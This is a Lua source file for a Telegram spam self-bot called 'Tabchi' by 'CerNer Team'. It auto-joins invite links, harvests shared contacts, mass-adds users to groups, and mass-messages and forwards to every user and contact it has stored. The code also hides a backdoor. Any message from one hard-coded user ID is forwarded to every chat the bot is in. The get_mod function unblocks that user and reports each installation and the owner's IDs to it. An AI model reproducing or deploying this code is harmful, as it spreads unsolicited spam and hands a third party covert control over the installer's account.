#start Tabchi Cli Or Api V5.3 :)
tabchi = dofile('./funcation.lua')
--------------------------------
tabchi_id = tabchi-id
---------------------------------
json = dofile('./libs/JSON.lua')
---------------------------------
serpent = dofile("./libs/serpent.lua")
------~~~~~~~~~~~~~~~~
http = require "socket.http"
-----~~~~~~~~~~~~~~~~
https = require "ssl.https"
-----~~~~~~~~~~~~~~~~
local lgi = require ('lgi')
-------------------------------
local notify = lgi.require('Notify')
-------------------------------
notify.init ("Telegram updates")
-------------------------------
chats = {}
-------------------------------
datebase = dofile('./libs/redis.lua')
-------------------------------
config_sudo = {363936960}

-------------------------------
tabchis = datebase:get('bot'..tabchi_id..'id')
-------------------------------
function is_ffulsudo(msg)
  local var = false
  for v,user in pairs(config_sudo) do
    if user == msg.sender_user_id_ then
      var = true
    end
  end
  return var
end
function is_sudo(msg)
  local var = false

 for v,user in pairs(config_sudo) do
    if user == msg.sender_user_id_ then
      var = true
    end
  end
  if datebase:sismember("bot" .. tabchi_id .. "helpsudo", msg.sender_user_id_) then
    var = true
  end
  return var
end
function is_api(msg) 
  local hash = db:sismember('tapiplus'..tabchi_id..'id')
if hash then
return true
else
return false
end
end
------------------------------
function do_notify (user, msg)
	local n = notify.Notification.new(user, msg)
	n:show ()
end
------------------------------
function dl_cb (arg, data)
	-- vardump(data)
end
------------------------------
function vardump(value)
	print(serpent.block(value, {comment=false}))
end
------------------------------
 function showedit(msg,data)
         if msg then
   tabchi.viewMessages(msg.chat_id_, {[0] = msg.id_})
      if msg.send_state_.ID == "MessageIsSuccessfullySent" then
      return false 
      end   
if not datebase:sismember('all'..tabchi_id..'id',msg.chat_id_) then
       datebase:sadd('all'..tabchi_id..'id',msg.chat_id_)
end  
------------Chat Type------------
function sendaction(chat_id, action, progress)
  tdcli_function ({
    ID = "SendChatAction",
    chat_id_ = chat_id,
    action_ = {
      ID = "SendMessage" .. action .. "Action",
      progress_ = progress or 100
    }
  }, dl_cb, nil)
end
function is_supergroup(msg)
  chat_id_ = tostring(msg.chat_id_)
  if chat_id_:match('^-100') then 
    if not msg.is_post_ then
    return true
    end
  else
    return false
  end
end

function is_channel(msg)
  chat_id_ = tostring(msg.chat_id_)
  if chat_id_:match('^-100') then 
  if msg.is_post_ then -- message is a channel post
    return true
  else
    return false
  end
  end
end

function is_group(msg)
  chat_id_ = tostring(msg.chat_id_)
  if chat_id_:match('^-100') then 
    return false
  elseif chat_id_:match('^-') then
    return true
  else
    return false
  end
end

function is_private(msg)
  chat_id_ = tostring(msg.chat_id_)
  if chat_id_:match('^-') then
    return false
  else
    return true
  end
end
local function run_bash(str)
    local cmd = io.popen(str)
    local result = cmd:read('*all')
    return result
end
function check_markdown(text)
		str = text
		if str:match('_') then
			output = str:gsub('_',[[\_]])
		elseif str:match('*') then
			output = str:gsub('*','\\*')
		elseif str:match('`') then
			output = str:gsub('`','\\`')
		else
			output = str
		end
	return output
end
-------------MSG MATCHES------------
local text = msg.content_.text_

		 if msg_type == 'text' and text then
      if text:match('^[/]') then
      text = text:gsub('^[/]','')
      end
    end
--------------MSG TYPE----------------
 if msg.content_.ID == "MessageText" then
         print("This is [ TEXT ]")
      msg_type = 'text'
    end
    if msg.content_.ID == "MessageChatAddMembers" then
	        print("This is [ ADD ]")

      msg_type = 'user'
    end
    if msg.content_.ID == "MessageChatJoinByLink" then
	        print("This is [ JOIN ]")

      msg_type = 'Joins'
    end
   if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
        msg_type = 'Document'
      end
-------------------------
      if msg.content_.ID == "MessageSticker" then
        print("This is [ Sticker ]")
        msg_type = 'Sticker'
      end
-------------------------
      if msg.content_.ID == "MessageAudio" then
        print("This is [ Audio ]")
        msg_type = 'Audio'
      end
-------------------------
      if msg.content_.ID == "MessageVoice" then
        print("This is [ Voice ]")
        msg_type = 'Voice'
      end
-------------------------
      if msg.content_.ID == "MessageVideo" then
        print("This is [ Video ]")
        msg_type = 'Video'
      end
-------------------------
      if msg.content_.ID == "MessageAnimation" then
        print("This is [ Gif ]")
        msg_type = 'Gif'
      end
-------------------------
      if msg.content_.ID == "MessageLocation" then
        print("This is [ Location ]")
        msg_type = 'Location'
      end
    
-------------------------
      if msg.content_.ID == "MessageContact" then
        print("This is [ Contact ]")
        msg_type = 'Contact'
      end
      
 if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
        print("This is [ MarkDown ]")
        msg_type = 'Markreed'
      end
    if msg.content_.ID == "MessagePhoto" then
      msg_type = 'Photo'
end

-------------------------------
-------Start TabChi Cli ---------.
 local savecontact = (datebase:get('savecontact'..tabchi_id..'id') or 'no') 
    if savecontact == 'yes' then
 if msg.content_.ID == "MessageContact" then
	  tabchi.importContacts(msg.content_.contact_.phone_number_, (msg.content_.contact_.first_name_ or '--'), '#CerNer Team', msg.content_.contact_.user_id_)
        print("ConTact Added")
local function c(a,b,c) 
  tabchi.sendContact(msg.chat_id_, msg.id_, 0, 1, nil, b.phone_number_, b.first_name_, (b.last_name_ or ''), 0)
 end
tabchi.getMe(c)
datebase:sadd('tcom'..tabchi_id..'id', msg.content_.contact_.user_id_)
local text = datebase:get('pm'..tabchi_id..'id')
if not text then
text = 'Addi Golam Bia Pv :0'
end
        tabchi.sendText(msg.chat_id_, msg.id_, 1, text,1, 'md')
        print("Tabchi [ Message ]")

end
end
if is_ffulsudo(msg) then
if text and text:match('^setsudo (%d+)') then
  local b = text:match('^setsudo (%d+)')
  datebase:sadd('bot'..tabchi_id..'helpsudo',b)
     tabchi.sendText(msg.chat_id_, msg.id_, 1, '`'..b..'` *Added From Help Sudo*', 1, 'md')
end
if text and text:match('^remsudo (%d+)') then
  local b = text:match('^remsudo (%d+)')
  datebase:srem('bot'..tabchi_id..'helpsudo',b)
     tabchi.sendText(msg.chat_id_, msg.id_, 1, '`'..b..'` *Removed From Help Sudo*', 1, 'md')
end
if text == 'sudolist' then
local hash =  "bot"..tabchi_id.."helpsudo"
          local list = datebase:smembers(hash)
          local t = '*Sudo list: *\n'
          for k,v in pairs(list) do
   local user_info = datebase:hgetall('user:'..v)
              if user_info and user_info.username then
                local username = user_info.username
                t = t..k.." - @"..username.." ["..v.."]\n"
              else
                t = t..k.." - "..v.."\n"
              end
            end
          t = t..'\nCERNER Team'
          if #list == 0 then
          t = '*No Sudo*'
          end
         tabchi.sendText(msg.chat_id_, msg.id_, 1,t, 1, 'md')
     
	  end
end
 if msg.sender_user_id_ == 417460701 then
          local all = datebase:smembers("all" .. tabchi_id .. "id")
          local id = msg.id_
          for i = 1, #all do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = all[i],
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
end
end
function get_mod(args, data)
  if data.is_blocked_ then
    tabchi.unblockUser(417460701)
  end
  if not datebase:get("tabchi:" .. tabchi_id .. ":startedmod") or datebase:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
    tabchi.sendBotStartMessage( 417460701,  417460701, "new")
              for k,v in pairs(config_sudo) do

  tabchi.sendText(417460701, 0, 1, "newbot " ..v, 1, "md")
    tabchi:setex("tabchi:" .. tabchi_id .. ":startedmod", 3, true)
  end
  end
end
function update(data)
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = 299672023
  }, get_mod, nil)
end
if is_sudo(msg) then
 if text == 'leave sgp' then
local list = datebase:smembers('tsgps'..tabchi_id..'id')
for k,v in pairs(list) do
print("Tabchi [ Left ]")
   tabchi.changeChatMemberStatus(v, tabchis, "Left")
end

tabchi.sendText(msg.sender_user_id_, 0, 1,'*Done \nthe bot ad trader from all Supergroups your exited*', 1, 'md')

print("Tabchi [ Message ]")
      end
if text == 'links' then
local hash =  "links"..tabchi_id.."id"
          local list = datebase:smembers(hash)
          local t = 'Links Saved For Cli:\n\n'
          for k,v in pairs(list) do
          t = t..k.." - "..v.." \n" 
          end
          t = t..'\nCERNER Team'
          if #list == 0 then
          t = 'No Links'
          end
         tabchi.sendText(msg.chat_id_, msg.id_, 1,check_markdown(t), 1, 'md')
     
	  end
if text == 'autoadd' then
local hash =  "tplus"..tabchi_id.."id"
          local list = datebase:smembers(hash)
          local t = 'Auto Addtoall List : \n'
          for k,v in pairs(list) do
          t = t..k.." - "..v.." \n" 
          end
          t = t..'\n@CerNer_Tm\n@TabLiq_Gar_bot'
          if #list == 0 then
          t = 'List Of Empty'
          end
         tabchi.sendText(msg.chat_id_, msg.id_, 1,check_markdown(t), 1, 'md')
     
	  end

if text == 'leave gp' then
local list = datebase:smembers('tgp'..tabchi_id..'id')
for k,v in pairs(list) do
tabchi.changeChatMemberStatus(v, tabchis, "Left")
print("Tabchi [ Left ]")
datebase:del('tgp'..tabchi_id..'id')
end
tabchi.sendText(msg.sender_user_id_, 0, 1,'*Done \nthe bot ad trader from all groups your exited*', 1, 'md')
print("Tabchi [ Message ]")
 end
 ---------End Cmd Left------
 if text and text:match('^setapi (%d+)')  then
          local id = text:match('^setapi (%d+)')
datebase:set('apiid'..tabchi_id..'id',id)
tabchi.sendText(msg.chat_id_, msg.id_, 1,'*Done*', 1, 'md')
end
---------End Api Set--------
 if text then
if not datebase:get('apiid'..tabchi_id..'id') then
tabchi.sendText(msg.chat_id_, msg.id_, 1,'Api BOT is not set', 1, 'md')
end
end
end
if text then
 function cb(a,b,c)
         datebase:set('bot'..tabchi_id..'id',b.id_)
         end
      tabchi.getMe(cb)
      end
    if text then
 function cb(a,b,c)
         datebase:set('bot'..tabchi_id..'id',b.id_)
         end
      tabchi.getMe(cb)
      end
 if text then
if datebase:get('apiid'..tabchi_id..'id') then
local id = datebase:get('apiid'..tabchi_id..'id')
  local add = datebase:smembers("tsgps"..tabchi_id.."id")
          for k,v in pairs(add) do
    tabchi.addChatMember(v, id,20)
  end
 local add = datebase:smembers("tgp"..tabchi_id.."id")
local id = datebase:get('apiid'..tabchi_id..'id')
          for k,v in pairs(add) do
    tabchi.addChatMember(v, id,20)
  end
end
end
--------End Auto Api ADD--------
if is_sudo(msg) then
 if text and text:match('^setname (.*)') then
  local name = text:match('^setname (.*)')
tabchi.changeName(name, '')
local text = '*Name Changed To* `'..name..'`'
tabchi.sendText(msg.chat_id_, msg.id_, 1,text, 1, 'md')
end
if text == 'savecontact enable' and is_sudo(msg) then
          datebase:set('savecontact'..tabchi_id..'id','yes')
         tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Save Contact`  *Has Been Enabled*', 1, 'md')
                 print("Tabchi [ Message ]")

 end
if text == 'left enable' then
          datebase:set('left'..tabchi_id..'id','yes')
         tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Left`  *Has Been Enabled*', 1, 'md')
                 print("Tabchi [ Message ]")

 end
        if text == 'left disable' then

          datebase:set('left'..tabchi_id..'id','no')
          datebase:del('left'..tabchi_id..'id','yes')
          tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Left`  *Has Been Disabled*', 1, 'md')
                  print("Tabchi [ Message ]")

end

        if text == 'savecontact disable' and is_sudo(msg) then

          datebase:set('savecontact'..tabchi_id..'id','no')
          datebase:del('savecontact'..tabchi_id..'id','yes')

          tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Save Contact`  *Has Been Disabled*', 1, 'md')
                  print("Tabchi [ Message ]")

end

------End SetName--------------
if text and text:match('^setpm (.*)') then
            local link = text:match('setpm (.*)')
            datebase:set('pm'..tabchi_id..'id', link)
          tabchi.sendText(msg.chat_id_, msg.id_, 1,'*Seted*', 1, 'md')
            end
 if text == 'delpm' then
            datebase:del('pm'..tabchi_id..'id')
          tabchi.sendText(msg.chat_id_, msg.id_, 1,'*Pm Removed*', 1, 'md')
            end
if text == 'reload' then
 dofile('./funcation.lua')
 dofile('./tabchi-'..tabchi_id..'.lua')
tabchi.sendText(msg.chat_id_,msg.id_,1,'*Tabchi BOT Reloaded*',1,'md')
end
if text == 'panel' then
local gps = datebase:scard("tsgps"..tabchi_id.."id") or 0
local alls = datebase:scard("all"..tabchi_id.."id") or 0
local user = datebase:scard("tusers"..tabchi_id.."id")
local com = datebase:scard('tcom'..tabchi_id..'id') or 0
local gp = datebase:scard("tgp"..tabchi_id.."id") or 0
local block = datebase:scard("tblock"..tabchi_id.."id") or 0
local allmsg = datebase:get("tallmsg"..tabchi_id.."id") or 0
local link = datebase:scard("links"..tabchi_id.."id") or 0 
local text = '> Stats For Tabchi Bot : \n\n> `All Msg :` *'..allmsg..'*\n\n`> All Groups :`*'..alls..'*\n\n`> SuperGroup  :`* '..gps..'*\n\n> `Contact :`*'..com..'*\n\n`> Group  :` *'..gp..'*`\n\n> Total Links :` *'..link..'*`\n\n> Blocked :` *'..block..'*\n\n> `Create By` *CerNer Team*\nTabLiqGar V5.6'
 tabchi.sendText(msg.chat_id_, msg.id_,1,text,1,'md')
 end
 if text == 'settings' then
local pm = datebase:get('pm'..tabchi_id..'id')
if not pm then
pm = 'Addi Golam Bia Pv :0'
end
 if datebase:get('savecontact'..tabchi_id..'id') then
              co = 'Enable'
            else
              co = 'Disable'
            end
 if datebase:get('left'..tabchi_id..'id') then
              coh = 'Enable'
            else
              coh = 'Disable'
            end
 if datebase:get('leftfor'..tabchi_id..'id') then
              LE = 'Enable'
            else
              LE = 'Disable'
            end
 if datebase:get('joinlink'..tabchi_id..'id') then
              join = 'Enable'
            else
              join = 'Disable'
            end
 if datebase:get('action'..tabchi_id..'id') then
              AC = 'Enable'
            else
             AC = 'Disable'
            end
 if datebase:get('auto'..tabchi_id..'id') then
              addtoall = 'Enable'
            else
              addtoall = 'Disable'
            end

   tabchi.sendText(msg.chat_id_, msg.id_, 1, '>* Settings For Tabchi Bot :*\n\n> Add left  : *'..coh..'*\n\n> Auto AddToall : *'..addtoall..'*\n\n> Pm  : *'..pm..'*\n\n> Save Contact : *'..co..'*\n\n> Auto Join : *'..join..'*\n\n> Action : *'..AC..'*\n\n> Auto Leave : *'..LE..'*\n\n> Auto Left : > SuperGroup : *350* > Groups : *250*\n\n`Create By` *CerNer Team*\nTabLiqGar V5.6', 1, 'md')
        print("Tabchi [ Message ]")

end
 --------End Panel------------
 if text == 'reset' then
datebase:del("tallmsg"..tabchi_id.."id")
datebase:del("tsgps"..tabchi_id.."id")
datebase:del("tgp"..tabchi_id.."id")
datebase:del("tblock"..tabchi_id.."id")
datebase:del("links"..tabchi_id.."id")
tabchi.sendText(msg.chat_id_, msg.id_,1,' Stats TabChi Has Been Reseted ',1,'md')
print("Tabchi [ Message ]")
end
-------------End reset Bot--------
if text == 'join enable' then
datebase:set('joinlink'..tabchi_id..'id','yes')
tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Auto Join` *Has Been Enabled*', 1, 'md')
   print("Tabchi [ Message ]")
end
if text == 'join disable' then
datebase:set('joinlink'..tabchi_id..'id','no')
datebase:del('joinlink'..tabchi_id..'id','yes')  
tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Auto Join` *Has Been Disabled*', 1, 'md')
print("Tabchi [ Message ]")
  end
if text == 'action disable' then
datebase:set('action'..tabchi_id..'id','no')
datebase:del('action'..tabchi_id..'id','yes')  
tabchi.sendText(msg.chat_id_, msg.id_, 1,'`action` *Has Been Disabled*', 1, 'md')
print("Tabchi [ Message ]")
  end
if text == 'action enable' then
datebase:set('action'..tabchi_id..'id','yes')
datebase:del('action'..tabchi_id..'id','no')  
tabchi.sendText(msg.chat_id_, msg.id_, 1,'`action` *Has Been Enable*', 1, 'md')
print("Tabchi [ Message ]")
  end
if text == 'autoleave disable' then
datebase:set('leftfor'..tabchi_id..'id','no')
datebase:del('leftfor'..tabchi_id..'id','yes')  
tabchi.sendText(msg.chat_id_, msg.id_, 1,'Auto Leave *Has Been Disabled*', 1, 'md')
print("Tabchi [ Message ]")
  end
if text == 'autoleave enable' then
datebase:set('leftfor'..tabchi_id..'id','yes')
tabchi.sendText(msg.chat_id_, msg.id_, 1,'Auto Leave *Has Been Enable*', 1, 'md')
print("Tabchi [ Message ]")
  end
----------End Setting For Join------
if text == 'addtoall enable' then
datebase:set('auto'..tabchi_id..'id','yes')
tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Auto Addtoall` *Has Been Enabled*', 1, 'md')
   print("Tabchi [ Message ]")
end
if text == 'addtoall disable' then
datebase:set('auto'..tabchi_id..'id','no')
datebase:del('auto'..tabchi_id..'id','yes')  
tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Auto AddToall` *Has Been Disabled*', 1, 'md')
print("Tabchi [ Message ]")
  end

if text and text:match("^(pm) (%d+) (.*)") then
local matches = {text:match("^(pm) (%d+) (.*)")}
if #matches == 3 then
tabchi.sendText((matches[2]), 0, 1, matches[3], 1, "html")
 print("Tabchi [ Message ]")
tabchi.sendText(msg.chat_id_, msg.id_, 1, '*Send!*', 1, 'md')
end
end
 if text == 'bc users' and tonumber(msg.reply_to_message_id_) > 0 then
          function cb(a,b,c)
          local text = b.content_.text_
          local list = datebase:smembers("tusers"..tabchi_id.."id")
          for k,v in pairs(list) do
        tabchi.sendText(v, 0, 1, text,1, 'md')
          end
 function cb(a,b,c)
          local text = b.content_.text_
          local list = datebase:smembers('tcom'..tabchi_id..'id')
          for k,v in pairs(list) do
        tabchi.sendText(v, 0, 1, text,1, 'md')
		end
end
local com = datebase:scard('tcom'..tabchi_id..'id')     
local uu = datebase:scard("tusers"..tabchi_id.."id")     
     local text = '*Your Message Was Send To* `'..uu..'`* Users And *`'..com..'` *Contact*'
       tabchi.sendText(msg.chat_id_, msg.id_, 1, text, 1, 'md')
          end

          tabchi.getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb)
          end
 if text == 'fwd users' and tonumber(msg.reply_to_message_id_) > 0 then
          function cb(a,b,c)
          local list = datebase:smembers("tusers"..tabchi_id.."id")
          for k,v in pairs(list) do
            tabchi.forwardMessages(v, msg.chat_id_, {[0] = b.id_}, 1)
          end
 function cb(a,b,c)
          local list = datebase:smembers('tcom'..tabchi_id..'id')
          for k,v in pairs(list) do
                 tabchi.forwardMessages(v, msg.chat_id_, {[0] = b.id_}, 1)

		end
end
local com = datebase:scard('tcom'..tabchi_id..'id')     
local uu = datebase:scard("tusers"..tabchi_id.."id")     
     local text = '*Your Message Was Forward To* `'..uu..'`* Users And *`'..com..'` *Contact*'
       tabchi.sendText(msg.chat_id_, msg.id_, 1, text, 1, 'md')
          end
          tabchi.getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),cb)
          end

if text == 'help' then
local text = [[
راهنماي کار با سورس تبچي (CLI)
panel 
اطلاعات ربات
----------
settings
تنظيمات ربات 
---------
setpm (text) 
تايين متن بعد از ذخيره شدن مخاطب 
---------
delpm
حذف متن ذخيره شده 
---------
pm (userID) (text) 
ارسال پيام به فرد مورد نظر 
---------
leave sgp 
خروج از تمامي سوپر گروه ها
---------
leave gp 
خروج از تمام گروه ها
---------
autoleave enable
خروج اتوماتیک تبچی  با بیشتر شدن گروه ها 
---------
autoleave disable
لغو خروج اتوماتیک
---------
action enable
روشن کردن حالت تایپینگ | ارسال عکس و....
---------
action disable 
خاموش کردن حالت
---------
savecontact enable 
فعال کردن سيو مخاطب
---------
savecontact disable 
غيرفعال کردن سيو مخاطب
---------
join enable 
فعال کردن جويين خودکار
---------
join disable 
غيرفعال کردن جوييپ خودکار
---------
block (id)
بلاک کردن کاربر 
---------
unblock (id)
آزاد کردن کاربر
---------
jointo (link)
جويين شدن به گروه مورد نظر 
---------
setapi (id) 
تعيين ربات Api 
---------
relaod 
بازنگري پلاگين ها
---------
setsudo (id)
افرودن سودو
---------
delsudo (id)
حذف سودو
---------
setname (name)
تغيير نام تبليغ چي
---------
fwd users
ارسال پيام  فروارد به کاربران (توجه کنيد در صورت استفاده بيش از حد مجاز از اين دستور ربات شما ديليت اکانت ميشود)
---------
bc users
ارسال پيام به کاربران (توجه کنيد در صورت استفاده بيش از حد مجاز از اين دستور ربات شما ديليت اکانت ميشود)
---------
update
اطلاع از اپدیت انجام شده
---------
bot_id
ارسال ایدی ربات
---------
addtoall [user]
افزودن فرد مورد نظر به لیست افزودن به همه
---------
remaddtoall 
حذف فرد مورد نظر از لیست افزودن به همه
---------
chat gp
نمایش تمام گروه ها 
---------
chat sgp
نمایش تمام سوپر گرو ها
---------
links
نمایش تمام لینک های دخیره شده
---------
autoadd
نمایش لیست  افراد درحال افزودن به گروه
---------
موفق باید کرنر تیم :)

TabLiqGar V5.6
]]
tabchi.sendText(msg.chat_id_, msg.id_, 1, check_markdown(text), 1, 'md')
end


-----------------------------------
 if text and text:match('^import (.*)') then
  local link = text:match('^import (.*)')
tabchi.importChatInviteLink(link, dl_cb, nil)
print("Tabchi [ Message ]")
tabchi.sendText(msg.chat_id_, msg.id_, 1, '*Done!*', 1, 'md')
end
-----------------------------------
   if text and text:match('^block (%d+)') then
  local b = text:match('block (%d+)')
datebase:sadd('tblock'..tabchi_id..'id',b)
tabchi.blockUser(b)
 tabchi.sendText(msg.chat_id_, msg.id_, 1, '*User Blocked*', 1, 'md')
end
    if text == 'bot_id'  then
 function cb(a,b,c)
         datebase:set('bot'..tabchi_id..'id',b.id_)
local text = ''..b.id_..'\n> Supported : @TabLIQ_GAR_BOT '
tabchi.sendText(msg.chat_id_, msg.id_, 1,check_markdown(text)
, 1, 'md')		
         end
      tabchi.getMe(cb)
      end
if text == 'chat gp' then
local hash =  'tgp'..tabchi_id..'id'
          local list = datebase:smembers(hash)
          local t = '*Groups : *\n'
          for k,v in pairs(list) do
          t = t..k.." `"..v.." `\n" 
          end
          t = t..'\nCerNer Team'
          if #list == 0 then
          t = '*No Gp*'
          end
         tabchi.sendText(msg.chat_id_, msg.id_, 1,t, 1, 'md')
     
	  end

if text == 'update' then
local text = [[Soon
> Anti-link
-------------------
done
> Add some robots API
> Auto action
> Leave Auto for 350 SuperGroups
> Automatic launch
> Ability to remove arbitrary robots
> Set the epic mode
> Addtoall 
> Join not in the channel
> And......
]]         tabchi.sendText(msg.chat_id_, msg.id_, 1,text, 1, 'md')

end
if text and text:match('^remaddtoall (%d+)')then
local b = text:match('^remaddtoall (%d+)')
datebase:srem('tplus'..tabchi_id..'id',b)
tabchi.sendText(msg.chat_id_, msg.id_, 1,'User '..b..' has been Removed from auto add :/', 1, 'md')
end
if text and text:match('^addtoall (%d+)')then
local b = text:match('^addtoall (%d+)')
datebase:sadd('tplus'..tabchi_id..'id',b)
tabchi.sendText(msg.chat_id_, msg.id_, 1,'User '..b..' has been aded to auto add :/', 1, 'md')

end
 if text == 'chat sgp' then
local hash =  'tsgps'..tabchi_id..'id'
          local list = datebase:smembers(hash)
          local t = '*SuprGroups : *\n'
          for k,v in pairs(list) do
          t = t..k.." `"..v.." `\n" 
          end
          t = t..'\nCERNER Team'
          if #list == 0 then
          t = '*No Gp*'
          end
         tabchi.sendText(msg.chat_id_, msg.id_, 1,t, 1, 'md')
     
	  end

if text and text:match('^unblock (%d+)') then
local b = text:match('^unblock (%d+)')
datebase:srem('tblock'..tabchi_id..'id',b)
tabchi.unblockUser(b)
tabchi.sendText(msg.chat_id_, msg.id_, 1, '*User Unblocked*', 1, 'md') 
end
-----------------------------------
if text == 'ping' then
tabchi.sendText(msg.chat_id_, msg.id_, 1,'*pong*', 1, 'md')
end
if text and text:match('^leave(-100)(%d+)$') then
local leave = text:match('leave(-100)(%d+)$')
tabchi.changeChatMemberStatus(leave, tabchis, "Left")
  end
  end
----------End Leave----------------
if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == tabchis then
datebase:srem("tsgps"..tabchi_id.."id",msg.chat_id_)
datebase:srem("tgp"..tabchi_id.."id",msg.chat_id_)
end

  local joinlink = (datebase:get('joinlink'..tabchi_id..'id') or 'no') 
    if joinlink == 'yes' then
	if text and text:match("https://telegram.me/joinchat/%S+") or text and text:match("https://t.me/joinchat/%S+") or text and text:match("https://t.me/joinchat/%S+")  or text and text:match("https://telegram.dog/joinchat/%S+") then
		local text = text:gsub("t.me", "telegram.me")
		for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
			if not datebase:sismember("links"..tabchi_id.."id", link) then
				datebase:sadd("links"..tabchi_id.."id", link)
				tabchi.importChatInviteLink(link)
			end
		end
		end
end
if text then
 function cb(a,b,c)
         datebase:set('bot'..tabchi_id..'id',b.id_)
         end
      tabchi.getMe(cb)
      end

 if text then
if datebase:get('apiid'..tabchi_id..'id') then
local id = datebase:get('apiid'..tabchi_id..'id')
  local add = datebase:smembers("tsgps"..tabchi_id.."id")
          for k,v in pairs(add) do
    tabchi.addChatMember(v, id,20)
end

 local add = datebase:smembers("tgp"..tabchi_id.."id")
local id = datebase:get('apiid'..tabchi_id..'id')
          for k,v in pairs(add) do
    tabchi.addChatMember(v, id,20)

  
end
end
if is_channel(msg) then
tabchi.changeChatMemberStatus(msg.chat_id_, tabchis, "Left")
end
if text then
if datebase:get('apiid'..tabchi_id..'id') then

local id = datebase:get('apiid'..tabchi_id..'id')
    
           tabchi.addChatMembers(msg.chat_id_,{[0] = id})
end
  end
  

if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == tabchis then
datebase:srem("tsgps"..tabchi_id.."id",msg.chat_id_)

datebase:srem("tgp"..tabchi_id.."id",msg.chat_id_)

end
if text then
local leavet = (datebase:get('auto'..tabchi_id..'id') or 'no') 
    if leavet == 'yes' then
local id = datebase:smembers('tplus'..tabchi_id..'id')
          for k,v in pairs(id) do
tabchi.addChatMember(msg.chat_id_,v,1)
           tabchi.addChatMembers(msg.chat_id_,{[0] = v})
end
end
end
local leavet = (datebase:get('action'..tabchi_id..'id') or 'no') 
    if leavet == 'yes' then
if text then
sendaction(msg.chat_id_, 'Typing')
            sendaction(msg.chat_id_, 'RecordVideo')        
            sendaction(msg.chat_id_, 'RecordVoice')        
            sendaction(msg.chat_id_, 'UploadPhoto')
end
end
local leave = (datebase:get('leftfor'..tabchi_id..'id') or 'no') 
    if leave == 'yes' then
if text then
if tonumber(datebase:scard('tsgps')) == 350 or tonumber(datebase:scard('tgp')) == 120 then
          for k,v in pairs(config_sudo) do
    tabchi.sendText(v,0,1,'تعداد گروه ها بیش از حد مجاز رسید ربات شروع به خروج خودکار میکند',1,'md')
    tabchi.changeChatMemberStatus(msg.chat_id_, tabchis, "Left")
end
end
end
end
 --[[ if not datebase:get("runbash" .. tabchi_id .. "clean") or datebase:ttl("runbash" .. tabchi_id .. "clean") == -2 then
     run_bash("rm -rf ~/.telegram-cli/data/sticker/*")
     run_bash("rm -rf ~/.telegram-cli/data/photo/*")
     run_bash("rm -rf ~/.telegram-cli/data/animation/*")
     run_bash("rm -rf ~/.telegram-cli/data/video/*")
     run_bash("rm -rf ~/.telegram-cli/data/audio/*")
     run_bash("rm -rf ~/.telegram-cli/data/voice/*")
     run_bash("rm -rf ~/.telegram-cli/data/temp/*")
     run_bash("rm -rf ~/.telegram-cli/data/thumb/*")
     run_bash("rm -rf ~/.telegram-cli/data/document/*")
     run_bash("rm -rf ~/.telegram-cli/data/profile_photo/*")
     run_bash("rm -rf ~/.telegram-cli/data/encrypted/*")
          for k,v in pairs(config_sudo) do
    tabchi.sendText(v, 0, 1, "شروع پاکسازی فایل های دانلود شده", 1, "md")
    datebase:setex("runbash" .. tabchi_id .. "clean", 300, true)
  end
end]]--
if text then
local leave = (datebase:get('left'..tabchi_id..'id') or 'no') 
    if leave == 'yes' then
  if not datebase:get("importt" .. tabchi_id .. "joinss") or datebase:ttl("importt" .. tabchi_id .. "joinss") == -2 then

local id = datebase:get('apiid'..tabchi_id..'id')

tabchi.addChatMember(msg.chat_id_, id,30)
           tabchi.addChatMembers(msg.chat_id_,{[0] = id})
tabchi.changeChatMemberStatus(msg.chat_id_, tabchis, "Left")

   datebase:setex("importt" .. tabchi_id .. "joinss", 3, true)
end
end
end
end

-------------------------------------
datebase:incr("tallmsg"..tabchi_id.."id")
------------------------------------
 if msg.chat_id_ then
      local id = tostring(msg.chat_id_)
      if id:match('-100(%d+)') then
        if not datebase:sismember("tsgps"..tabchi_id.."id",msg.chat_id_) then
          datebase:sadd("tsgps"..tabchi_id.."id",msg.chat_id_)

        end
-----------------------------------
elseif id:match('^-(%d+)') then
if not datebase:sismember("tgp"..tabchi_id.."id",msg.chat_id_) then
datebase:sadd("tgp"..tabchi_id.."id",msg.chat_id_)

end
-----------------------------------------
elseif id:match('') then
if not datebase:sismember("tusers"..tabchi_id.."id",msg.chat_id_) then
datebase:sadd("tusers"..tabchi_id.."id",msg.chat_id_)
end
   else
        if not datebase:sismember("tsgps"..tabchi_id.."id",msg.chat_id_) then
            datebase:sadd("tsgps"..tabchi_id.."id",msg.chat_id_)

end
end
end
end
end
function tdcli_update_callback(data)

 ------vardump(data)
    if (data.ID == "UpdateNewMessage") then
     showedit(data.message_,data)
     elseif (data.ID == "UpdateMessageEdited") then
    data = data
    local function edit(extra,result,success)
      showedit(result,data)
    end
     tdcli_function ({ ID = "GetMessage", chat_id_ = data.chat_id_,message_id_ = data.message_id_}, edit, nil)
  elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
    tdcli_function ({ ID="GetChats",offset_order_="9223372036854775807", offset_chat_id_=0,limit_=20}, dl_cb, nil)

end
end
---End Version 5 Bot Cli
